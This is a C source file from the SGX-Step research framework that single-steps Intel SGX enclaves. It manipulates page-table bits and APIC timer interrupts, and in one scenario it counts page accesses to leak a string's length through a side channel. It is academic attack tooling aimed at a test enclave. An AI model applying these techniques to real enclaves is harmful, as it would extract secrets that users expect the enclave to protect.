/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <signal.h>
#include <unistd.h>
#include "libsgxstep/apic.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/config.h"

#ifndef NUM_RUNS
    #define NUM_RUNS                100
#endif

#define MICROBENCH                  1
#define STRLEN                      2
#define ZIGZAGGER                   3
#ifndef ATTACK_SCENARIO
    #define ATTACK_SCENARIO         MICROBENCH
#endif

sgx_enclave_id_t eid = 0;
int strlen_nb_access = 0;
int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
uint64_t *pte_encl = NULL;
uint64_t *pmd_encl = NULL;


/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */

/* Called before resuming the enclave after an Asynchronous Enclave eXit. */
void aep_cb_func(uintptr_t erip)
{
    #ifdef M32
        /* 32-bit calling convention expects erip on stack */
        asm __volatile__("movl %%edi, %0" : "=r"(erip));
    #endif

    uint64_t erip_offset = erip - (uintptr_t) get_enclave_base();
    info("^^ enclave RIP=%#llx (offset=%#llx)", (uint64_t)erip, erip_offset);
    irq_cnt++;

    /* XXX insert custom attack-specific side-channel observation code here */
    #if (ATTACK_SCENARIO == STRLEN)
        if (ACCESSED(*pte_encl))
        {
            info("accessed!");
            strlen_nb_access++;
        }
        *pte_encl = MARK_NOT_ACCESSED( *pte_encl );
    #endif

    if (do_irq && (irq_cnt > NUM_RUNS*500))
    {
        info("excessive interrupt rate detected (try adjusting timer interval " \
             "to avoid getting stuck in zero-stepping); aborting...");
	do_irq = 0;
    }

    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     * 
     */
    if (do_irq)
    {
        *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
        apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
    }
}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signal)
{
	info("Caught fault %d! Restoring enclave page permissions..", signal);
    *pmd_encl = MARK_NOT_EXECUTE_DISABLE(*pmd_encl);
    ASSERT(fault_cnt++ < 10);

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}


/* ================== ATTACKER INIT/SETUP ================= */

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
	print_system_settings();

    if (isatty(fileno(stdout)))
    {
        info("WARNING: interactive terminal detected; known to cause ");
        info("unstable timer intervals! Use stdout file redirection for ");
        info("precise single-stepping results...");
    }

    register_aep_cb(aep_cb_func);
    register_enclave_info(/*edbgrd_rip=*/ 1);
    print_enclave_info();
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void)
{
    #if (ATTACK_SCENARIO == STRLEN)
        void *str_adrs;
        SGX_ASSERT( get_str_adrs( eid, &str_adrs) );
        info("enclave str adrs at %p\n", str_adrs);
        //print_page_table( str_adrs );
        pte_encl = remap_page_table_level( str_adrs, PTE);
    #endif

    //print_page_table( get_enclave_base() );
    pmd_encl = remap_page_table_level( get_enclave_base(), PMD);
    #if SINGLE_STEP_ENABLE
        *pmd_encl = MARK_EXECUTE_DISABLE(*pmd_encl);
    #endif
}

/* Hook local APIC timer in /dev/sgx-step driver and setup one-shot mode. */
void attacker_config_apic(void)
{
    apic_timer_oneshot();
    apic_hook();
}

/* Restore local APIC in TSC deadline mode. */
void attacker_restore_apic(void)
{
    apic_timer_deadline();
}


/* ================== ATTACKER MAIN ================= */

/* Untrusted main function to create/enter the trusted enclave. */
int main( int argc, char **argv )
{
    sgx_launch_token_t token = {0};
    int apic_fd, encl_strlen = 0, updated = 0;

    info("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
                                    &token, &updated, &eid, NULL ) );

    /* 1. Setup attack execution environment. */
    attacker_config_runtime();
    attacker_config_page_table();
    attacker_config_apic();

    /* 2. Single-step enclaved execution. */
    info("calling enclave: attack=%d; num_runs=%d; timer=%d",
        ATTACK_SCENARIO, NUM_RUNS, SGX_STEP_TIMER_INTERVAL);

    #if (ATTACK_SCENARIO == ZIGZAGGER)
        SGX_ASSERT( do_zigzagger(eid, NUM_RUNS) );
    #elif (ATTACK_SCENARIO == STRLEN)
        SGX_ASSERT( do_strlen(eid, &encl_strlen, NUM_RUNS) );
        info("strlen returned by enclave is %d", encl_strlen);
        info("attacker counted %d", strlen_nb_access);
    #else
        SGX_ASSERT( do_nop_slide(eid) );
    #endif

    /* 3. Restore normal execution environment. */
    attacker_restore_apic();
    SGX_ASSERT( sgx_destroy_enclave( eid ) );

    info("all done; counted %d IRQs", irq_cnt);
    return 0;
}
